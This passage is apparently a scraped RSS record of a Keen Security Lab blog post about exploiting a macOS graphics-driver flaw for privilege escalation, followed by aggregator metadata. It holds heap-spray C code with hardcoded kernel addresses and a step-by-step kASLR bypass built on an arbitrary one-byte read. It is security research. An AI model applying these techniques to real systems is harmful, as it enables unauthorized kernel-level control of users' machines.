steps:<br> \n  <figure class=\"highlight plain\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\">mach_msg_size_t size = 0x2000;</span><br><span class=\"line\">mach_port_name_t my_port[0x500];</span><br><span class=\"line\">memset(my_port, 0, 0x500 * sizeof(mach_port_name_t));</span><br><span class=\"line\">char *buf = malloc(size);</span><br><span class=\"line\">memset(buf, 0x41, size);</span><br><span class=\"line\">*(unsigned long *)(buf - 0x18 + 0x1230) = 0xffffff8062388000 - 0xd0 + 2;</span><br><span class=\"line\">*(unsigned long *)(buf - 0x18 + 0x230) = 0xffffff8062388000 - 0xd0 + 2;</span><br><span class=\"line\"></span><br><span class=\"line\">for (int i = 0; i &lt; 0x500; i++) {</span><br><span class=\"line\"> *(unsigned int *)buf = i;</span><br><span class=\"line\"> printf(\"number %x success with %x.\\n\",i , send_msg(buf, size, &amp;my_port[i]));</span><br><span class=\"line\">}</span><br><span class=\"line\">for (int i = 0x130; i &lt; 0x250; i++)</span><br><span class=\"line\">{</span><br><span class=\"line\"> read_kern_data(my_port[i]);</span><br><span class=\"line\">}</span><br><span class=\"line\">printf(\"press enter to fill in IOSurface2.\\n\");</span><br><span class=\"line\">io_service_t serv = open_service(\"IOAccelerator\");</span><br><span class=\"line\">io_connect_t *deviceConn2;</span><br><span class=\"line\">deviceConn2 = malloc(0x12000 * sizeof(io_connect_t));</span><br><span class=\"line\">kern_return_t kernResult;</span><br><span class=\"line\">for (int i =0; i &lt; 0x12000; i ++)</span><br><span class=\"line\">{</span><br><span class=\"line\"> kernResult = IOServiceOpen(serv, mach_task_self(), 0x100, &amp;deviceConn2[i]);</span><br><span class=\"line\"> printf(\"%x with result %x.\\n\", i , kernResult);</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p>You will be more clear with this figure.<br><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469798364668.png\" alt=\"overwrite-service-field\" /></br></p> \n<h4 id=\"Head-or-middle\"><a href=\"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#Head-or-middle\" class=\"headerlink\" title=\"Head or middle?\"></a>Head or middle?</h4> \n<p>Smart readers may have noticed a critical problem. Given the size of userclient is 0x2000, how can you be sure that head of the userclient falles right at <code>A</code>? Why can not <code>A</code> falls at middle of the <code>IGAccelVideoContext</code>.</p> \n<p>Yes you’re right. It’s a 50-50 chance. If <code>A</code> falls at middle of userclient, overwriting <code>A - 4 + 0x528</code> will corrupt nothing meaningful, lead to failure of exploitation. Can we let this happen? Absolutely not. We need to trigger the write twice, to write both at <code>A - 4 + 0x528</code> and <code>A - 4 + 0x528 + 0x1000</code>.</p> \n<p>So you can now understand why I mentioned earlier we may need to do a double-write in kalloc.48. By changing the value of sprayed content in <code>IOCatalogueSendData</code> in a odd-even style, and triggering the vulnerability multiple times, we can ensure that there’s a nearly 100% chance that both two locations will be overwritten. </p> \n<h4 id=\"Bypassing-kASLR\"><a href=\"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#Bypassing-kASLR\" class=\"headerlink\" title=\"Bypassing kASLR\"></a>Bypassing kASLR</h4> \n<p>We know Steve Jobs (or Tim Cook?) will not make our life so easy as we still have a big obstacle to overcome: the Royal kASLR, even we have already figured out a way to control RIP. But when there’s a will, there is a way.<br>Let’s revisit what we have. we have known address <code>A</code> covered with <code>IGAccelVideoContext</code>. Known address <code>B</code> covered with <code>vm_map_copy</code> content controlled and we can also change the content as we wish, just freeing and refill the <code>ool_msg</code>s. Are there any function of some userclients that will return a particular content at a specified address, given we now control the whole body of the <code>fake</code> userclient? </br></p> \n<p>With a bit of luck the externalMethod function <code>get_hw_steppings</code> caught our attention.<br> \n  <figure class=\"highlight plain\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br /></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\">__int64 __fastcall IGAccelVideoContext::get_hw_steppings(IGAccelVideoContext *a1, _DWORD *a2)</span><br><span class=\"line\">{</span><br><span class=\"line\">  __int64 service; // rax@1</span><br><span class=\"line\"></span><br><span class=\"line\">  service = a1-&gt;service;</span><br><span class=\"line\"> *a2 = *(_DWORD *)(service + 0x1140);</span><br><span class=\"line\"> a2[1] = *(_DWORD *)(service + 0x1144);</span><br><span class=\"line\"> a2[2] = *(_DWORD *)(service + 0x1148);</span><br><span class=\"line\"> a2[3] = *(_DWORD *)(service + 0x114C);</span><br><span class=\"line\"> a2[4] = *(unsigned __int8 *)(*(_QWORD *)(service + 0x1288) + 0xD0LL);</span><br><span class=\"line\"> return 0LL;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p>Eureka!<br> \n  <figure class=\"highlight plain\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br /></pre></td> \n     <td class=\"code\"><pre><span class=\"line\">a2[4] = *(unsigned __int8 *)(*(_QWORD *)(service + 0x1288) + 0xD0LL);</span><br /></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p>Given the <code>service + 0x1288</code> is controlled by us, this is a perfect way to return value at arbitrary address. Although only one byte is returned, it’s not a big deal because we can free and refill the ool_msgs as many times as we wish and read one byte by one. We now come up with these steps.</p> \n<ul> \n <li>By spraying we can ensure 0xf… 62388000(A) lies an IGAccelVideoContext. And 0xf… bf800000(B) lies an vm_map_copy with size 0x2000</li> \n <li>Overwrite the service pointer to B, point to controlled vm_map_copy filled with 0x4141414141414141 (except at 0x1288 set to A - 0xD0)</li> \n <li>Test for 0x41414141 by calling get_hw_steppings on sprayed userclients</li> \n <li>If match, we get the index of userclient being corrupted. a2[4] returns a byte at A!<br>You will be more clear with this figure:<br><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469798724994.png\" alt=\"content-detection\" /></br></br></li> \n</ul> \n<h4 id=\"Head-or-middle-again\"><a href=\"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#Head-or-middle-again\" class=\"headerlink\" title=\"Head or middle, again\"></a>Head or middle, again</h4> \n<p>Smart reader will again noticed that we are currently assuming <code>A</code> falls at beginning of a <code>IGAccelVideoContext</code>. Also, nobody guarantees <code>B</code> falls right at the beginning the 0x2000 size vm_map_copy. It’s also a 50-50 chance.</p> \n<p>For the latter, we take the same approach. When we are preparing ool_msg, we change 0x1288 and 0x288 both to A - 0xD0. For the former problem it’s a bit more complicated.</p> \n<p>We have an observation that at the 0x1000 offset of a normal <code>IGAccelVideoContext</code>, the value are zero. This gives us a way to distinguish the two situations, given that now we can read out the content at address <code>A</code>. We can use an additional read to determine if the address is at <code>A</code> or <code>A+0x1000</code>. If we try <code>A</code> but its actually at <code>A+0x1000</code>, we will read byte at +0x1000 of <code>IGAccelVideoContext</code>, which is 0, then we can try again with <code>A+0x1000</code> to read the correct value.<br><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469800272540.png\" alt=\"0x1000-offset\" /></br></p> \n<p>These two figures may give you a more clearly concept on this trial-and-error approach.<br><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469799496455.png\" alt=\"first-try\"><br><img src=\"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469799508728.png\" alt=\"second-try\" /></br></img></br></p> \n<h2 id=\"Wrap-it-up\"><a href=\"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#Wrap-it-up\" class=\"headerlink\" title=\"Wrap it up\"></a>Wrap it up</h2> \n<p>Leak arbitrary address, leak vtable pointer, prepare your gadgets, ahh. I’m a bit tired hmm, so if you are curious about what the <code>blitzard</code> vulnerability itself actually is, don’t miss our talk at Mandalay Bay GH at August 3 11:30, Blackhat USA. Wish to see you there :)</p> \n<p>Also, it’s a pity the vulnerability is not selected for pwnie nominations, we will come up with a better one next year :)</p> \n<p>Here is the video, some spraying time is omitted:<br> \n  <div class=\"video-container\"> \n   <iframe src=\"//www.youtube.com/embed/1bnSDgzZDc0\" frameborder=\"0\" allowfullscreen=\"\"></iframe> \n  </div></br></p>","descriptionType":"html","publishedDate":"Fri, 29 Jul 2016 14:12:41 +0000","feedId":17218,"bgimg":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469783147725.png","linkMd5":"1c0ad2a8b68a69aabfd76bcf72d6e89b","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn45@2020_4/2020/10/19/02-33-04-396_2e4662316111aa3b.webp","destWidth":983,"destHeight":238,"sourceBytes":38486,"destBytes":13004,"author":"","articleImgCdnMap":{"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469783147725.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn45@2020_4/2020/10/19/02-33-04-396_2e4662316111aa3b.webp","http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/formula1.jpg":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn6@2020_2/2020/10/19/02-33-08-684_7f6374477e71855e.webp","http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/formula2.jpg":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn10@2020_4/2020/10/19/02-33-07-257_499dd2cb6cc3e97f.webp","http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/formula3.jpg":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn81@2020_2/2020/10/19/02-33-09-315_0a6ce5285bfa63d3.webp","http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469792242612.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn51@2020_6/2020/10/19/02-33-09-630_48dc78514cd26ccf.webp","http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469792270537.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn73@2020_5/2020/10/19/02-33-08-976_008b86c159b0968f.webp","http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469792304375.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn61@2020_5/2020/10/19/02-33-09-897_8f1fdf0229caa7dc.webp","http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469785931993.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn90@2020_2/2020/10/19/02-33-09-399_a635e981c1b69907.webp","http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469785992006.png":null,"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469786702894.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn2@2020_2/2020/10/19/02-33-11-779_53b074f5105aeb35.webp","http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469793140738.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn94@2020_1/2020/10/19/02-33-09-190_bc903b78122c525e.webp","http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469793670597.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn69@2020_2/2020/10/19/02-33-09-280_4daabd9d59f15bdc.webp","http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469798364668.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn50@2020_3/2020/10/19/02-33-09-161_5331ba653be35f4a.webp","http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469798724994.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn65@2020_3/2020/10/19/02-33-10-426_4b4d4c0f4c1e34c0.webp","http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469800272540.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn98@2020_5/2020/10/19/02-33-09-413_3301f4aa17c4ee64.webp","http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469799496455.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn78@2020_3/2020/10/19/02-33-09-921_86f143d1bec9e414.webp","http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469799508728.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn57@2020_1/2020/10/19/02-33-09-508_5d603cc4ae3e283c.webp"},"publishedOrCreatedDate":1603074771460}],"record":{"createdTime":"2020-10-19 10:32:51","updatedTime":"2020-10-19 10:32:51","feedId":17218,"fetchDate":"Mon, 19 Oct 2020 02:32:51 +0000","fetchMs":4263,"handleMs":5495,"totalMs":32527,"newArticles":0,"totalArticles":19,"status":1,"type":0,"ip":"af32bc2b950854f7e62e0df470d818c9","hostName":"us-037*","requestId":"47a0eaeaf88a42c384dc1a703fb8c68a_17218","contentType":"text/xml; charset=utf8","totalBytes":461396,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":17,"articlesImgsGithubTotal":16,"successGithubMap":{"myreaderx25":1,"myreaderx15":1,"myreaderx16":1,"myreaderx6":1,"myreaderx4":1,"myreaderx10":1,"myreaderx11":1,"myreaderx3":1,"myreaderx33":1,"myreaderx2":1,"myreaderx1":1,"myreaderx24":1,"myreaderx13":1,"myreaderx31":1,"myreaderx29":1,"myreaderx19":1},"failGithubMap":{"myreaderx23":1}},"feed":{"createdTime":"2020-09-07 02:14:36","updatedTime":"2020-09-07 02:47:46","id":17218,"name":"Keen Security Lab Blog","url":"http://keenlab.tencent.com/en/atom.xml","subscriber":194,"website":null,"icon":"http://keenlab.tencent.com/favicon.ico","icon_jsdelivr":null,"description":"","weekly":null,"link":"http://keenlab.tencent.com"},"noPictureArticleList":[{"createdTime":"2020-10-19 10:33:12","updatedTime":"2020-10-19 10:33:12","id":null,"feedId":17218,"linkMd5":"1c0ad2a8b68a69aabfd76bcf72d6e89b"}],"tmpCommonImgCdnBytes":13004,"tmpBodyImgCdnBytes":448392,"tmpBgImgCdnBytes":0,"extra4":{"start":1603074760323,"total":0,"statList":[{"spend":5642,"msg":"获取xml内容"},{"spend":5495,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":7396,"msg":"正文链接上传到cdn"}]},"extra5":17,"extra6":17,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469785992006.png","sourceStatusCode":200,"destWidth":458,"destHeight":599,"sourceBytes":31766,"destBytes":9990,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":2975,"convertSpendMs":25,"createdTime":"2020-10-19 10:33:05","host":"us-005*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn86/contents/2020/10/19/02-33-08-329_8b5fe7e2473bfc90.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Mon, 19 Oct 2020 02:33:08 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["C020:62DF:1D95FD:67F262:5F8CFAE4"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1603076645"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn86/contents/2020/10/19/02-33-08-329_8b5fe7e2473bfc90.webp","historyStatusCode":[],"spendMs":129},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"31 KB","destSize":"9.8 KB","compressRate":"31.4%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469785992006.png","sourceStatusCode":200,"destWidth":458,"destHeight":599,"sourceBytes":31766,"destBytes":9990,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":2100,"convertSpendMs":14,"createdTime":"2020-10-19 10:33:08","host":"us-005*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn86/contents/2020/10/19/02-33-10-532_8b5fe7e2473bfc90.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Mon, 19 Oct 2020 02:33:10 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["C020:62DF:1D9600:67F26D:5F8CFAE5"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1603076645"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn86/contents/2020/10/19/02-33-10-532_8b5fe7e2473bfc90.webp","historyStatusCode":[],"spendMs":47},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"31 KB","destSize":"9.8 KB","compressRate":"31.4%"}],"extra10_invalidATagHrefValue":{"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/_#RIP-control":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#RIP-control","http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/_#Wrap-it-up":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#Wrap-it-up","http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/_#The-IGVector-add-function":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#The-IGVector-add-function","http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/_#Write-a-float-to-control-RIP":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#Write-a-float-to-control-RIP","http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/_#IGAccelVideoContext-comes-to-rescue":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#IGAccelVideoContext-comes-to-rescue","http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/_#Decreasing-spray-speed-Why":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#Decreasing-spray-speed-Why","http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/_#Head-or-middle":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#Head-or-middle","http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/_#Control-the-kalloc-48-zone":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#Control-the-kalloc-48-zone","http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/_#Bypassing-kASLR":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#Bypassing-kASLR","http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/_#Head-or-middle-again":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/#Head-or-middle-again"},"extra111_proxyServerAndStatMap":{"http://europe-56.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-013.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe68.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-021.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-005.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-009.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-52.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-038.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-025.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-001.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-017.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-036.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-033.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe64.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-22.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-029.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469783147725.png","sourceStatusCode":200,"destWidth":983,"destHeight":238,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn45@2020_4/2020/10/19/02-33-04-396_2e4662316111aa3b.webp","sourceBytes":38486,"destBytes":13004,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":4796,"convertSpendMs":10,"createdTime":"2020-10-19 10:33:00","host":"europe-22*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b,1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"37.6 KB","destSize":"12.7 KB","compressRate":"33.8%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/formula2.jpg","sourceStatusCode":200,"destWidth":1238,"destHeight":102,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn10@2020_4/2020/10/19/02-33-07-257_499dd2cb6cc3e97f.webp","sourceBytes":19192,"destBytes":11658,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":2771,"convertSpendMs":6,"createdTime":"2020-10-19 10:33:05","host":"europe-22*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"18.7 KB","destSize":"11.4 KB","compressRate":"60.7%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/formula1.jpg","sourceStatusCode":200,"destWidth":1314,"destHeight":112,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn6@2020_2/2020/10/19/02-33-08-684_7f6374477e71855e.webp","sourceBytes":27669,"destBytes":21634,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":4039,"convertSpendMs":8,"createdTime":"2020-10-19 10:33:05","host":"us-009*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"27 KB","destSize":"21.1 